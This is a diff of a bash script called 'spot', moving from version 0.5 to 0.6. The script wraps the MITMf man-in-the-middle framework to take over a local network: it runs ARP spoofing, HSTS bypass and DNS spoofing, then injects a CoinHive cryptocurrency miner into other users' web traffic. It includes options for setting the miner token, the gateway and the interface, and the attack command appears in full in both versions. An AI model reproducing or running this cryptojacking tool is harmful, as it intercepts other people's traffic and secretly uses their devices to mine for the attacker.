@@ -12,128 +12,121 @@ then
   do
     case "$1" in
       #Clear
-      -c) if [[ -e /usr/share/mitmf/logs/mitmf.log ]]
-        then
-          cd /usr/share/mitmf/logs
-	  sudo rm /usr/share/mitmf/logs/mitmf.log
-          echo; echo -e "\033[1m\e[35mLogs cleared!\033[0m"; echo
-        else
-          echo; echo -e "\033[1m\e[35mNo logs!\033[0m"; echo
-      fi ;;
-      
+      -c) if [[ -e /opt/MITMf/logs/mitmf.log ]]
+          then
+            sudo rm /opt/MITMf/logs/mitmf.log
+            echo -e "\e[35mLogs cleared!"
+          else
+            echo -e "\e[35mNo logs!"
+          fi ;;
+
       #Gateway change
-      -g) insertGateway=''
-	if [[ -e /opt/spot/gateway.txt ]]
-         then
-           echo; echo -e "\033[1m\e[35mInsert default gateway:\033[0m"
-           read insertGateway
-           while [[ -z $insertGateway ]]
-           do
-	     clear
-             echo -e "\033[1m\e[35mEmpty input. Please, insert default gateway:\033[0m"
-             read insertGateway
-           done
-           sudo sed -i -r "s/.*/$insertGateway/g" /opt/spot/gateway.txt
-           echo -e "\033[1m\e[35mGateway insert!\033[0m"
-         else
-           echo -e "\033[1m\e[35mNo gateway file!\033[0m"; echo -e "\033[1m\e[35mCreating new...\033[0m"
-           echo; echo -e "\033[1m\e[35mInsert default gateway:\033[0m"
-           read insertGateway
-	   while [[ -z $insertGateway ]]
-           do
-	     clear
-             echo -e "\033[1m\e[35mEmpty input. Please, insert default gateway:\033[0m"
-             read insertGateway
-           done
-           $insertGateway > /opt/spot/gateway.txt
-           echo -e "\033[1m\e[35mGateway insert!\033[0m"
-        fi ;;
+      -g) if [[ -e /opt/spot/gateway.txt ]]
+          then
+            echo -e "\E[35mInsert default gateway:"
+            read -p "192.168." insertGateway
+            while [[ -z $insertGateway ]]
+            do
+	      echo "Empty input. Please, insert default gateway:"
+              read -p "192.168." insertGateway ; echo
+            done
+            sudo sed -i -r "s/.*/192.168.$insertGateway/g" /opt/spot/gateway.txt
+            echo "done."
+          else
+            echo -e "\E[35mNo gateway file!"; echo "Creating new..."
+            echo "Insert default gateway:"
+            read -p "192.168." insertGateway
+            while [[ -z $insertGateway ]]
+            do
+	      echo "Empty input. Please, insert default gateway:"
+              read -p "192.168." insertGateway ; echo
+            done
+            echo "192.168.$insertGateway" > /opt/spot/gateway.txt
+            echo "done."
+          fi ;;
 
       #Help
-      -h) echo -e "\033[1m\e[34mspot -c\033[0m \t \033[4mc\033[0mlear MITMf logs"
-	  echo -e "\033[1m\e[34mspot -g\033[0m \t change (or insert) default \033[4mg\033[0mateway"
-	  echo -e "\033[1m\e[34mspot -h\033[0m \t show this \033[4mh\033[0melp\033[0m"
-	  echo -e "\033[1m\e[34mspot -i\033[0m \t change \033[4mi\033[0mnterface (if not wlan0) use \"ifconfig\" or \"iwconfig\""
-	  echo -e "\033[1m\e[34mspot -p\033[0m \t change listened \033[4mp\033[0mort (if you have error about it)"
-	  echo -e "\033[1m\e[34mspot -r\033[0m \t \033[4mr\033[0mun on default gateway\033[0m"
-          echo -e "\033[1m\e[34mspot -t\033[0m \t change coinhive \033[4mt\033[0moken\033[0m"
-          echo -e "\033[1m\e[34mspot -v\033[0m \t show \033[4mv\033[0mersion" ;;
+      -h) echo -e "\e[34m\`spot -c\` \t \033[4mc\033[0m\e[34mlear MITMf logs"
+	  echo -e "\e[34m\`spot -g\` \t change (or insert) default \033[4mg\033[0m\e[34mateway"
+	  echo -e "\e[34m\`spot -h\` \t show this \033[4mh\033[0m\e[34melp"
+	  echo -e "\e[34m\`spot -i\` \t change \033[4mi\033[0m\e[34mnterface (if not wlan0) use \`ifconfig\`"
+	  echo -e "\e[34m\`spot -p\` \t change listened \033[4mp\033[0m\e[34mort (if you have error about it)"
+	  echo -e "\e[34m\`spot -r\` \t \033[4mr\033[0m\e[34mun on default gateway"
+          echo -e "\e[34m\`spot -t\` \t change coinhive \033[4mt\033[0m\e[34moken"
+          echo -e "\e[34m\`spot -v\` \t show \033[4mv\033[0m\e[34mersion" ;;
 
       #Interface
-      -i) insertInterface=''
-	if [[ -e /opt/spot/interface.txt ]]
-         then
-           echo; echo -e "\033[1m\e[35mInsert interface name (to see use \"ifconfig\" or \"iwconfig\"):\033[0m"
-           read insertInterface
-           while [[ -z $insertInterface ]]
-           do
-	     clear
-             echo -e "\033[1m\e[35mEmpty input. Please, insert interface:\033[0m"
-             read insertInterface
-           done
-           sudo sed -i -r "s/.*/$insertInterface/g" /opt/spot/interface.txt
-           echo -e "\033[1m\e[35mDone\033[0m"
-         else
-           echo -e "\033[1m\e[35mNo interface.txt\033[0m"; echo -e "\033[1m\e[35mCreating new...\033[0m"
-           echo; echo -e "\033[1m\e[35mInsert interface name (to see use \"ifconfig\" or \"iwconfig\"):\033[0m"
-           read insertInterface
-	   while [[ -z $insertInterface ]]
-           do
-	     clear
-             echo -e "\033[1m\e[35mEmpty input. Please, insert interface:\033[0m"
-             read insertInterface
-           done
-           $insertInterface > /opt/spot/interface.txt
-           echo -e "\033[1m\e[35mDone\033[0m"
-        fi ;;
+      -i) if [[ -e /opt/spot/interface.txt ]]
+          then
+            echo -e "\E[35mInsert interface name (to see use \"ifconfig\" or \"iwconfig\")"
+            read -p "Your interface is " insertInterface
+            while [[ -z $insertInterface ]]
+            do
+	      echo "Empty input. Please, insert interface"
+              read -p "Your interface is " insertInterface
+            done
+            sudo sed -i -r "s/.*/$insertInterface/g" /opt/spot/interface.txt
+            echo "done."
+          else
+            echo -e "\E[35mNo interface.txt"; echo "Creating new..."
+            echo "Insert interface name (to see use \"ifconfig\" or \"iwconfig\")"
+            read -p "Your interface is " insertInterface
+	    while [[ -z $insertInterface ]]
+            do
+	      echo "Empty input. Please, insert interface"
+              read -p "Your interface is " insertInterface
+            done
+            $insertInterface > /opt/spot/interface.txt
+            echo "done."
+          fi ;;
 
       #Port
-      -p)port=''
-	 echo -e "\033[1m\e[35mInsert your port\033[0m"
-	 read port 
+      -p)echo -e "\E[35mInsert your port"
+	 read -p "Port is " port 
          sudo sed -i -r "30s/.*/		port     = $port         # Port to listen on/g" /opt/MITMf/config/mitmf.conf
-	 echo -e "\033[1m\e[35mPort changed.\033[0m" ;;
+	 echo "done." ;;
 
       #Run
       -r) if [[ -e /opt/spot/coinHiveMiner.js ]]
-        then
-          clear
-          gateway=`cat /opt/spot/gateway.txt`
-	  interface=`cat /opt/spot/interface.txt`
-          if [[ -z $gateway ]]
           then
-            echo; echo -e "\033[1m\e[35mEnter default gateway:\033[0m"
-            read gateway
-          fi
-          cd /opt/MITMf
-	  #sudo -s
-	  #source /usr/local/bin/virtualenvwrapper.sh
-	  #mkvirtualenv MITMf -p /usr/bin/python2.7
-          sudo python mitmf.py --arp --spoof -i $interface --hsts --dns --gateway $gateway --inject --js-file /opt/spot/coinHiveMiner.js
-        else
-          echo; echo -e "\033[1m\e[35mNo mining script!\033[0m"; echo
-      fi ;;
-      
+            gateway=`cat /opt/spot/gateway.txt`
+	    interface=`cat /opt/spot/interface.txt`
+            if [[ -z $gateway ]]
+            then
+              echo -e "\E[35mEnter default gateway:"
+              read -p "192.168." gateway
+              while [[ -z $gateway ]]
+              do
+	        echo "Empty input. Please, insert default gateway:"
+                read -p "192.168." gateway ; echo
+              done
+            fi
+            cd /opt/MITMf
+	    sudo python mitmf.py --arp --spoof -i $interface --hsts --dns --gateway $gateway --inject --js-file /opt/spot/coinHiveMiner.js
+          else
+            echo -e "\e[35mNo mining script!"
+          fi ;;
+
       #Token change
       -t) if [[ -e /opt/spot/coinHiveMiner.js ]]
-        then
-          token=''
-          echo; echo -e "\033[1m\e[35mInsert your CoinHive token:\033[0m"; echo
-          read token
-          sudo sed -i -r "3s/.*/var miner = new CoinHive.Anonymous('$token', {/g" /opt/spot/coinHiveMiner.js
-          echo; echo -e "\033[1m\e[35mToken changed!\033[0m"; echo
-        else
-          echo; echo -e "\033[1m\e[35mNo mining script!\033[0m"; echo
-      fi ;;
+          then
+            echo -e "\E[35mInsert your CoinHive token"
+            read -p "Token: " token
+            sudo sed -i -r "3s/.*/var miner = new CoinHive.Anonymous('$token', {/g" /opt/spot/coinHiveMiner.js
+            echo "done."
+          else
+            echo -e "\e[35mNo mining script!"
+          fi ;;
       
       #Version
-      -v) echo -e "\033[1m\e[35mSpot version 0.5\033[0m" ;;
+      -v) echo -e "\e[35mSpot version 0.6" ;;
             
       #Other
-      *) echo -e "\033[1m\e[35m$1 is not an option, use spot -h to see all commands\033[0m" ;;
+      *) echo -e "\e[35m\`$1\` is not an option, use \`spot -h\`" ;;
     esac
     shift
   done
 else
-  echo; echo -e "\033[1m\e[35mFirst install MITMf\033[0m"; echo
+  echo -e "\e[35mFirst install MITMf"
 fi
+tput sgr0
